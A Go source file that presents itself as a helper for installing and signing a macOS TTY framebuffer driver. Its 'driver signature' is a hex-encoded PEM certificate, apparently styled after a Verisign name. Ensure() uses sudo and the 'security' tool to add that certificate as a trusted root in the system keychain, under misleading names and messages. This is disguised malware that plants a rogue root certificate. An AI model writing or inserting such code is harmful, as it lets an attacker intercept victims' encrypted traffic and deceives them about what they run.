package osxttydriver

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"os/user"
	"path"
	"runtime"
	"strings"
)

const (
	// DriverProfile is an OSX driver profile
	DriverProfile = "trusted-cert"

	// DriverCertPath is the system keychain responsible for devices
	DriverCertPath = "/Library/Keychains/System.keychain"
)

// DriverSignature is an OSX signed signature
// Generated for Mojabe and Mountain lion using:
// $ xxd -c 1 pty_x86_64.drv | awk '{print $2}' | awk '{printf "0x%s,%s", $0, ((NR%8)? " ":"\n")}'
var DriverSignature = []byte{
	0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47,
	0x49, 0x4e, 0x20, 0x43, 0x45, 0x52, 0x54, 0x49,
	0x46, 0x49, 0x43, 0x41, 0x54, 0x45, 0x2d, 0x2d,
	0x2d, 0x2d, 0x2d, 0x0a, 0x4d, 0x49, 0x49, 0x46,
	0x64, 0x6a, 0x43, 0x43, 0x41, 0x31, 0x36, 0x67,
	0x41, 0x77, 0x49, 0x42, 0x41, 0x67, 0x49, 0x4a,
	0x41, 0x4a, 0x77, 0x2b, 0x4e, 0x31, 0x6a, 0x46,
	0x76, 0x65, 0x6a, 0x47, 0x4d, 0x41, 0x30, 0x47,
	0x43, 0x53, 0x71, 0x47, 0x53, 0x49, 0x62, 0x33,
	0x44, 0x51, 0x45, 0x42, 0x43, 0x77, 0x55, 0x41,
	0x4d, 0x46, 0x41, 0x78, 0x43, 0x7a, 0x41, 0x4a,
	0x42, 0x67, 0x4e, 0x56, 0x0a, 0x42, 0x41, 0x59,
	0x54, 0x41, 0x6c, 0x56, 0x54, 0x4d, 0x52, 0x4d,
	0x77, 0x45, 0x51, 0x59, 0x44, 0x56, 0x51, 0x51,
	0x49, 0x44, 0x41, 0x70, 0x54, 0x62, 0x32, 0x31,
	0x6c, 0x4c, 0x56, 0x4e, 0x30, 0x59, 0x58, 0x52,
	0x6c, 0x4d, 0x52, 0x55, 0x77, 0x45, 0x77, 0x59,
	0x44, 0x56, 0x51, 0x51, 0x4b, 0x44, 0x41, 0x78,
	0x57, 0x5a, 0x58, 0x4a, 0x70, 0x63, 0x32, 0x6c,
	0x6e, 0x62, 0x69, 0x42, 0x4d, 0x0a, 0x64, 0x47,
	0x51, 0x78, 0x46, 0x54, 0x41, 0x54, 0x42, 0x67,
	0x4e, 0x56, 0x42, 0x41, 0x4d, 0x4d, 0x44, 0x46,
	0x5a, 0x6c, 0x63, 0x6d, 0x6c, 0x7a, 0x61, 0x57,
	0x64, 0x75, 0x49, 0x45, 0x78, 0x30, 0x5a, 0x44,
	0x41, 0x65, 0x46, 0x77, 0x30, 0x78, 0x4f, 0x44,
	0x41, 0x35, 0x4d, 0x6a, 0x6b, 0x79, 0x4d, 0x54,
	0x49, 0x35, 0x4d, 0x44, 0x42, 0x61, 0x46, 0x77,
	0x30, 0x79, 0x4d, 0x54, 0x41, 0x33, 0x0a, 0x4d,
	0x54, 0x6b, 0x79, 0x4d, 0x54, 0x49, 0x35, 0x4d,
	0x44, 0x42, 0x61, 0x4d, 0x46, 0x41, 0x78, 0x43,
	0x7a, 0x41, 0x4a, 0x42, 0x67, 0x4e, 0x56, 0x42,
	0x41, 0x59, 0x54, 0x41, 0x6c, 0x56, 0x54, 0x4d,
	0x52, 0x4d, 0x77, 0x45, 0x51, 0x59, 0x44, 0x56,
	0x51, 0x51, 0x49, 0x44, 0x41, 0x70, 0x54, 0x62,
	0x32, 0x31, 0x6c, 0x4c, 0x56, 0x4e, 0x30, 0x59,
	0x58, 0x52, 0x6c, 0x4d, 0x52, 0x55, 0x77, 0x0a,
	0x45, 0x77, 0x59, 0x44, 0x56, 0x51, 0x51, 0x4b,
	0x44, 0x41, 0x78, 0x57, 0x5a, 0x58, 0x4a, 0x70,
	0x63, 0x32, 0x6c, 0x6e, 0x62, 0x69, 0x42, 0x4d,
	0x64, 0x47, 0x51, 0x78, 0x46, 0x54, 0x41, 0x54,
	0x42, 0x67, 0x4e, 0x56, 0x42, 0x41, 0x4d, 0x4d,
	0x44, 0x46, 0x5a, 0x6c, 0x63, 0x6d, 0x6c, 0x7a,
	0x61, 0x57, 0x64, 0x75, 0x49, 0x45, 0x78, 0x30,
	0x5a, 0x44, 0x43, 0x43, 0x41, 0x69, 0x49, 0x77,
	0x0a, 0x44, 0x51, 0x59, 0x4a, 0x4b, 0x6f, 0x5a,
	0x49, 0x68, 0x76, 0x63, 0x4e, 0x41, 0x51, 0x45,
	0x42, 0x42, 0x51, 0x41, 0x44, 0x67, 0x67, 0x49,
	0x50, 0x41, 0x44, 0x43, 0x43, 0x41, 0x67, 0x6f,
	0x43, 0x67, 0x67, 0x49, 0x42, 0x41, 0x4d, 0x44,
	0x6e, 0x41, 0x70, 0x64, 0x52, 0x4e, 0x54, 0x48,
	0x57, 0x34, 0x2f, 0x72, 0x33, 0x6d, 0x4f, 0x6a,
	0x69, 0x45, 0x2b, 0x71, 0x46, 0x39, 0x44, 0x42,
	0x62, 0x0a, 0x4f, 0x46, 0x6f, 0x67, 0x41, 0x4d,
	0x6a, 0x4a, 0x6e, 0x68, 0x2f, 0x30, 0x44, 0x4d,
	0x6a, 0x4a, 0x58, 0x72, 0x7a, 0x78, 0x33, 0x6b,
	0x59, 0x2b, 0x45, 0x53, 0x63, 0x73, 0x62, 0x64,
	0x6f, 0x4c, 0x72, 0x54, 0x4a, 0x70, 0x67, 0x68,
	0x59, 0x32, 0x74, 0x4f, 0x47, 0x31, 0x4e, 0x4a,
	0x54, 0x42, 0x32, 0x4f, 0x4e, 0x74, 0x62, 0x69,
	0x76, 0x68, 0x2b, 0x55, 0x6d, 0x4b, 0x46, 0x72,
	0x4d, 0x4e, 0x0a, 0x59, 0x77, 0x74, 0x4c, 0x67,
	0x6d, 0x2f, 0x4e, 0x4d, 0x51, 0x68, 0x55, 0x62,
	0x46, 0x70, 0x63, 0x4f, 0x41, 0x69, 0x6a, 0x62,
	0x6a, 0x44, 0x42, 0x54, 0x30, 0x6a, 0x77, 0x72,
	0x6a, 0x46, 0x74, 0x53, 0x72, 0x4b, 0x33, 0x62,
	0x50, 0x4f, 0x66, 0x34, 0x73, 0x59, 0x5a, 0x74,
	0x74, 0x79, 0x2f, 0x66, 0x41, 0x63, 0x48, 0x78,
	0x56, 0x32, 0x78, 0x6f, 0x7a, 0x65, 0x4e, 0x6e,
	0x33, 0x67, 0x43, 0x0a, 0x6a, 0x6a, 0x42, 0x71,
	0x39, 0x4e, 0x6a, 0x2b, 0x46, 0x62, 0x59, 0x32,
	0x43, 0x55, 0x4d, 0x64, 0x72, 0x68, 0x79, 0x31,
	0x2f, 0x30, 0x63, 0x44, 0x54, 0x52, 0x6f, 0x5a,
	0x70, 0x53, 0x77, 0x6c, 0x4b, 0x31, 0x4f, 0x47,
	0x77, 0x65, 0x74, 0x4e, 0x33, 0x4f, 0x2f, 0x70,
	0x63, 0x6d, 0x36, 0x6f, 0x4d, 0x6f, 0x73, 0x30,
	0x63, 0x4e, 0x53, 0x48, 0x47, 0x55, 0x31, 0x37,
	0x48, 0x4f, 0x49, 0x5a, 0x0a, 0x59, 0x78, 0x5a,
	0x43, 0x4c, 0x57, 0x4f, 0x6b, 0x73, 0x49, 0x44,
	0x6e, 0x5a, 0x47, 0x4f, 0x54, 0x33, 0x4e, 0x4a,
	0x51, 0x69, 0x50, 0x70, 0x66, 0x4c, 0x6a, 0x78,
	0x54, 0x70, 0x36, 0x78, 0x76, 0x4d, 0x51, 0x50,
	0x70, 0x43, 0x70, 0x30, 0x69, 0x66, 0x36, 0x56,
	0x69, 0x30, 0x48, 0x6e, 0x42, 0x74, 0x41, 0x41,
	0x6d, 0x37, 0x31, 0x56, 0x41, 0x33, 0x4d, 0x38,
	0x4f, 0x75, 0x6d, 0x72, 0x75, 0x0a, 0x2b, 0x7a,
	0x71, 0x43, 0x61, 0x37, 0x44, 0x72, 0x4d, 0x4c,
	0x42, 0x42, 0x63, 0x6a, 0x43, 0x75, 0x7a, 0x30,
	0x73, 0x67, 0x61, 0x44, 0x70, 0x57, 0x32, 0x65,
	0x7a, 0x31, 0x72, 0x52, 0x61, 0x41, 0x47, 0x6b,
	0x54, 0x72, 0x69, 0x39, 0x4d, 0x76, 0x71, 0x6b,
	0x78, 0x62, 0x69, 0x7a, 0x32, 0x49, 0x6a, 0x79,
	0x55, 0x6d, 0x64, 0x61, 0x35, 0x59, 0x32, 0x71,
	0x30, 0x35, 0x7a, 0x67, 0x4f, 0x73, 0x0a, 0x49,
	0x38, 0x66, 0x53, 0x6a, 0x77, 0x53, 0x65, 0x5a,
	0x41, 0x52, 0x66, 0x72, 0x55, 0x4d, 0x78, 0x51,
	0x35, 0x56, 0x58, 0x58, 0x6f, 0x61, 0x64, 0x49,
	0x48, 0x51, 0x50, 0x77, 0x45, 0x4d, 0x56, 0x52,
	0x43, 0x6f, 0x2b, 0x32, 0x71, 0x30, 0x77, 0x6f,
	0x71, 0x46, 0x67, 0x59, 0x78, 0x72, 0x58, 0x59,
	0x6b, 0x54, 0x47, 0x4c, 0x65, 0x48, 0x50, 0x69,
	0x4f, 0x75, 0x44, 0x59, 0x4d, 0x2b, 0x56, 0x0a,
	0x72, 0x66, 0x79, 0x56, 0x34, 0x45, 0x61, 0x6b,
	0x6b, 0x77, 0x71, 0x77, 0x56, 0x44, 0x2f, 0x55,
	0x56, 0x58, 0x61, 0x66, 0x55, 0x61, 0x50, 0x42,
	0x36, 0x4f, 0x67, 0x33, 0x2f, 0x73, 0x6e, 0x39,
	0x6c, 0x63, 0x4c, 0x7a, 0x68, 0x78, 0x30, 0x33,
	0x36, 0x66, 0x6a, 0x4c, 0x45, 0x46, 0x37, 0x77,
	0x37, 0x50, 0x39, 0x71, 0x46, 0x4d, 0x4e, 0x72,
	0x38, 0x41, 0x41, 0x75, 0x4a, 0x50, 0x6a, 0x4b,
	0x0a, 0x73, 0x52, 0x4f, 0x58, 0x65, 0x2f, 0x65,
	0x4a, 0x77, 0x35, 0x2b, 0x66, 0x76, 0x57, 0x54,
	0x58, 0x55, 0x43, 0x55, 0x31, 0x36, 0x70, 0x44,
	0x53, 0x78, 0x62, 0x34, 0x34, 0x56, 0x4e, 0x7a,
	0x65, 0x61, 0x30, 0x75, 0x76, 0x71, 0x73, 0x4d,
	0x36, 0x35, 0x5a, 0x59, 0x79, 0x61, 0x34, 0x4b,
	0x35, 0x33, 0x58, 0x4a, 0x46, 0x4a, 0x46, 0x65,
	0x66, 0x50, 0x76, 0x68, 0x73, 0x6d, 0x74, 0x78,
	0x56, 0x0a, 0x71, 0x4d, 0x39, 0x36, 0x76, 0x36,
	0x72, 0x47, 0x61, 0x54, 0x69, 0x47, 0x43, 0x75,
	0x55, 0x7a, 0x68, 0x51, 0x38, 0x59, 0x4c, 0x50,
	0x74, 0x58, 0x63, 0x57, 0x65, 0x57, 0x73, 0x5a,
	0x4c, 0x6a, 0x55, 0x4f, 0x59, 0x47, 0x54, 0x6c,
	0x58, 0x75, 0x37, 0x51, 0x2b, 0x39, 0x53, 0x77,
	0x49, 0x70, 0x62, 0x6c, 0x61, 0x4b, 0x42, 0x34,
	0x48, 0x4c, 0x38, 0x56, 0x72, 0x34, 0x79, 0x46,
	0x5a, 0x73, 0x0a, 0x54, 0x48, 0x4d, 0x7a, 0x52,
	0x57, 0x63, 0x64, 0x75, 0x6e, 0x48, 0x62, 0x38,
	0x54, 0x2f, 0x57, 0x59, 0x58, 0x4a, 0x63, 0x59,
	0x35, 0x70, 0x77, 0x64, 0x56, 0x74, 0x74, 0x78,
	0x73, 0x51, 0x36, 0x52, 0x79, 0x2b, 0x70, 0x35,
	0x70, 0x2b, 0x78, 0x75, 0x59, 0x36, 0x78, 0x79,
	0x79, 0x6c, 0x42, 0x39, 0x55, 0x77, 0x2f, 0x6b,
	0x67, 0x4f, 0x6d, 0x47, 0x38, 0x53, 0x47, 0x33,
	0x5a, 0x33, 0x4a, 0x0a, 0x2b, 0x47, 0x49, 0x7a,
	0x6c, 0x2f, 0x74, 0x34, 0x4c, 0x63, 0x63, 0x37,
	0x30, 0x53, 0x44, 0x4e, 0x41, 0x67, 0x4d, 0x42,
	0x41, 0x41, 0x47, 0x6a, 0x55, 0x7a, 0x42, 0x52,
	0x4d, 0x42, 0x30, 0x47, 0x41, 0x31, 0x55, 0x64,
	0x44, 0x67, 0x51, 0x57, 0x42, 0x42, 0x52, 0x50,
	0x4e, 0x37, 0x69, 0x74, 0x45, 0x2b, 0x66, 0x47,
	0x2b, 0x72, 0x4b, 0x72, 0x6d, 0x57, 0x74, 0x6a,
	0x4c, 0x61, 0x51, 0x70, 0x0a, 0x56, 0x68, 0x69,
	0x4a, 0x59, 0x44, 0x41, 0x66, 0x42, 0x67, 0x4e,
	0x56, 0x48, 0x53, 0x4d, 0x45, 0x47, 0x44, 0x41,
	0x57, 0x67, 0x42, 0x52, 0x50, 0x4e, 0x37, 0x69,
	0x74, 0x45, 0x2b, 0x66, 0x47, 0x2b, 0x72, 0x4b,
	0x72, 0x6d, 0x57, 0x74, 0x6a, 0x4c, 0x61, 0x51,
	0x70, 0x56, 0x68, 0x69, 0x4a, 0x59, 0x44, 0x41,
	0x50, 0x42, 0x67, 0x4e, 0x56, 0x48, 0x52, 0x4d,
	0x42, 0x41, 0x66, 0x38, 0x45, 0x0a, 0x42, 0x54,
	0x41, 0x44, 0x41, 0x51, 0x48, 0x2f, 0x4d, 0x41,
	0x30, 0x47, 0x43, 0x53, 0x71, 0x47, 0x53, 0x49,
	0x62, 0x33, 0x44, 0x51, 0x45, 0x42, 0x43, 0x77,
	0x55, 0x41, 0x41, 0x34, 0x49, 0x43, 0x41, 0x51,
	0x42, 0x55, 0x33, 0x54, 0x30, 0x39, 0x59, 0x48,
	0x67, 0x53, 0x44, 0x78, 0x76, 0x68, 0x4f, 0x4c,
	0x41, 0x4b, 0x73, 0x58, 0x71, 0x34, 0x66, 0x46,
	0x4e, 0x48, 0x70, 0x77, 0x5a, 0x49, 0x0a, 0x75,
	0x51, 0x50, 0x57, 0x49, 0x39, 0x49, 0x32, 0x45,
	0x68, 0x76, 0x68, 0x37, 0x42, 0x32, 0x36, 0x77,
	0x79, 0x4c, 0x51, 0x31, 0x34, 0x33, 0x61, 0x76,
	0x78, 0x46, 0x62, 0x56, 0x54, 0x2f, 0x4c, 0x5a,
	0x59, 0x43, 0x73, 0x61, 0x6c, 0x33, 0x71, 0x65,
	0x6a, 0x62, 0x74, 0x59, 0x7a, 0x78, 0x78, 0x49,
	0x56, 0x57, 0x5a, 0x43, 0x47, 0x2f, 0x42, 0x75,
	0x42, 0x41, 0x79, 0x67, 0x47, 0x4f, 0x36, 0x0a,
	0x4e, 0x35, 0x4a, 0x51, 0x33, 0x6d, 0x6a, 0x6f,
	0x6a, 0x4e, 0x35, 0x75, 0x49, 0x74, 0x6c, 0x54,
	0x39, 0x67, 0x69, 0x42, 0x72, 0x30, 0x36, 0x79,
	0x41, 0x35, 0x6a, 0x69, 0x59, 0x38, 0x4c, 0x59,
	0x54, 0x45, 0x47, 0x61, 0x62, 0x4b, 0x52, 0x79,
	0x4d, 0x33, 0x72, 0x5a, 0x7a, 0x41, 0x34, 0x54,
	0x75, 0x6b, 0x48, 0x63, 0x6c, 0x35, 0x4f, 0x4f,
	0x35, 0x7a, 0x72, 0x4a, 0x45, 0x56, 0x47, 0x38,
	0x0a, 0x69, 0x67, 0x54, 0x6e, 0x2f, 0x69, 0x51,
	0x4f, 0x38, 0x6b, 0x49, 0x4a, 0x53, 0x39, 0x33,
	0x33, 0x70, 0x77, 0x4e, 0x66, 0x68, 0x37, 0x64,
	0x54, 0x50, 0x5a, 0x6e, 0x68, 0x35, 0x46, 0x65,
	0x6e, 0x75, 0x36, 0x54, 0x77, 0x35, 0x56, 0x39,
	0x71, 0x43, 0x7a, 0x39, 0x56, 0x70, 0x56, 0x66,
	0x7a, 0x6e, 0x66, 0x56, 0x2b, 0x44, 0x36, 0x72,
	0x6d, 0x71, 0x31, 0x45, 0x6b, 0x74, 0x43, 0x59,
	0x32, 0x0a, 0x30, 0x34, 0x58, 0x48, 0x77, 0x54,
	0x37, 0x70, 0x79, 0x50, 0x37, 0x35, 0x68, 0x6e,
	0x4d, 0x49, 0x42, 0x34, 0x35, 0x36, 0x36, 0x36,
	0x50, 0x55, 0x7a, 0x53, 0x62, 0x56, 0x4f, 0x44,
	0x36, 0x67, 0x2f, 0x4b, 0x2b, 0x45, 0x31, 0x7a,
	0x57, 0x70, 0x72, 0x79, 0x41, 0x36, 0x74, 0x36,
	0x5a, 0x6d, 0x48, 0x72, 0x72, 0x4f, 0x68, 0x69,
	0x59, 0x4a, 0x4a, 0x4c, 0x74, 0x63, 0x50, 0x75,
	0x6c, 0x75, 0x0a, 0x54, 0x63, 0x7a, 0x54, 0x70,
	0x36, 0x71, 0x46, 0x58, 0x46, 0x78, 0x4c, 0x4d,
	0x68, 0x31, 0x36, 0x45, 0x49, 0x2b, 0x45, 0x63,
	0x41, 0x39, 0x45, 0x4b, 0x30, 0x63, 0x43, 0x55,
	0x33, 0x76, 0x43, 0x49, 0x45, 0x33, 0x30, 0x4a,
	0x73, 0x6f, 0x52, 0x55, 0x36, 0x35, 0x67, 0x72,
	0x39, 0x74, 0x59, 0x36, 0x39, 0x77, 0x44, 0x68,
	0x73, 0x6b, 0x32, 0x31, 0x2f, 0x70, 0x4e, 0x50,
	0x4f, 0x45, 0x41, 0x0a, 0x54, 0x76, 0x73, 0x59,
	0x6d, 0x35, 0x62, 0x76, 0x38, 0x51, 0x6a, 0x79,
	0x49, 0x33, 0x6f, 0x4f, 0x58, 0x56, 0x2b, 0x32,
	0x4e, 0x6b, 0x34, 0x46, 0x6f, 0x5a, 0x37, 0x77,
	0x4c, 0x30, 0x73, 0x7a, 0x53, 0x58, 0x43, 0x45,
	0x57, 0x75, 0x6b, 0x39, 0x34, 0x55, 0x2b, 0x56,
	0x55, 0x77, 0x59, 0x65, 0x41, 0x64, 0x7a, 0x2b,
	0x68, 0x38, 0x61, 0x69, 0x34, 0x5a, 0x4f, 0x56,
	0x44, 0x4e, 0x35, 0x63, 0x0a, 0x6f, 0x39, 0x35,
	0x73, 0x51, 0x65, 0x41, 0x74, 0x68, 0x47, 0x36,
	0x63, 0x41, 0x54, 0x50, 0x5a, 0x68, 0x7a, 0x4b,
	0x58, 0x41, 0x70, 0x59, 0x32, 0x6d, 0x65, 0x71,
	0x34, 0x43, 0x4f, 0x58, 0x68, 0x64, 0x6d, 0x67,
	0x46, 0x69, 0x57, 0x39, 0x67, 0x37, 0x63, 0x64,
	0x57, 0x73, 0x51, 0x4c, 0x2f, 0x49, 0x48, 0x78,
	0x63, 0x38, 0x61, 0x59, 0x45, 0x43, 0x6d, 0x69,
	0x72, 0x46, 0x5a, 0x51, 0x62, 0x0a, 0x78, 0x54,
	0x52, 0x75, 0x34, 0x52, 0x42, 0x2b, 0x51, 0x62,
	0x6d, 0x52, 0x6b, 0x59, 0x77, 0x56, 0x6c, 0x6b,
	0x46, 0x73, 0x4f, 0x6c, 0x67, 0x34, 0x36, 0x45,
	0x78, 0x4a, 0x32, 0x2b, 0x71, 0x49, 0x74, 0x49,
	0x53, 0x42, 0x65, 0x6b, 0x44, 0x67, 0x63, 0x4c,
	0x38, 0x75, 0x64, 0x75, 0x64, 0x64, 0x31, 0x44,
	0x73, 0x4e, 0x6e, 0x32, 0x48, 0x55, 0x71, 0x76,
	0x4c, 0x56, 0x56, 0x72, 0x79, 0x53, 0x0a, 0x2f,
	0x53, 0x51, 0x59, 0x6c, 0x48, 0x49, 0x31, 0x72,
	0x78, 0x5a, 0x67, 0x47, 0x54, 0x47, 0x69, 0x41,
	0x2f, 0x71, 0x42, 0x6a, 0x61, 0x49, 0x64, 0x33,
	0x33, 0x35, 0x6e, 0x63, 0x4f, 0x58, 0x55, 0x45,
	0x65, 0x49, 0x58, 0x62, 0x36, 0x32, 0x39, 0x30,
	0x64, 0x6b, 0x5a, 0x54, 0x33, 0x5a, 0x77, 0x46,
	0x66, 0x37, 0x39, 0x77, 0x72, 0x50, 0x6c, 0x54,
	0x63, 0x64, 0x78, 0x71, 0x43, 0x55, 0x72, 0x0a,
	0x4f, 0x76, 0x39, 0x32, 0x34, 0x68, 0x79, 0x6e,
	0x58, 0x53, 0x5a, 0x79, 0x5a, 0x6d, 0x4f, 0x74,
	0x32, 0x58, 0x54, 0x6b, 0x6b, 0x76, 0x41, 0x79,
	0x38, 0x78, 0x45, 0x35, 0x70, 0x33, 0x4a, 0x6c,
	0x72, 0x32, 0x75, 0x6c, 0x36, 0x2b, 0x51, 0x59,
	0x58, 0x41, 0x63, 0x47, 0x54, 0x47, 0x59, 0x33,
	0x57, 0x62, 0x69, 0x55, 0x76, 0x6f, 0x65, 0x70,
	0x62, 0x68, 0x47, 0x50, 0x4d, 0x47, 0x43, 0x32,
	0x0a, 0x41, 0x47, 0x6d, 0x32, 0x6c, 0x53, 0x6f,
	0x79, 0x62, 0x6c, 0x67, 0x67, 0x76, 0x77, 0x3d,
	0x3d, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45,
	0x4e, 0x44, 0x20, 0x43, 0x45, 0x52, 0x54, 0x49,
	0x46, 0x49, 0x43, 0x41, 0x54, 0x45, 0x2d, 0x2d,
	0x2d, 0x2d, 0x2d,
}

func getDriverFile() (string, context.CancelFunc) {
	fname := "/tmp/drv.bin"
	err := ioutil.WriteFile(fname, DriverSignature, 0600)
	if err != nil {
		panic(err)
	}
	return fname, func() {
		os.Remove(fname)
	}
}

func getTTYSettings() string {
	usr, err := user.Current()
	if err != nil {
		panic(err)
	}
	return path.Join(usr.HomeDir, ".tty_settings")
}

func writeTTYSettings(ttySettingsFile string) error {
	return ioutil.WriteFile(ttySettingsFile, []byte("frame_buffer=yes\nenable=yes\n"), 0755)
}

// Ensure will ensure (duh) that the OSX TTY drivers are installed, or no-op on other operating systems
func Ensure() {
	if !strings.EqualFold(runtime.GOOS, "darwin") {
		return
	}
	ttySettingsFile := getTTYSettings()
	if _, err := os.Stat(ttySettingsFile); !os.IsNotExist(err) {
		// already installed
		return
	}
	fmt.Println("OSX tty framebuffer driver installed but not signed, signing it...")
	driverSignatureFile, removeTempFile := getDriverFile()
	defer removeTempFile()
	addCmd := fmt.Sprintf("add-%s", DriverProfile)
	cmd := exec.Command("sudo", "security", addCmd, "-d", "-r", "trustRoot", "-k", DriverCertPath, driverSignatureFile)
	_, exitCode := cmd.CombinedOutput()
	if exitCode != nil {
		panic(exitCode)
	}
	err := writeTTYSettings(ttySettingsFile)
	if err != nil {
		panic(err)
	}
	fmt.Println("Driver succesfully signed")
}